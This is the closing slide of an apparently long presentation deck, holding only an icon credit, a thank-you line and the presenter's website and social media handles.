###### **Icons from:**

● https://www.freepik.com

## Slide 166

# **Thank you**

**m** arek **t** ot **h** .com ( **mth** .dev)

@marektoth

@marek-toth
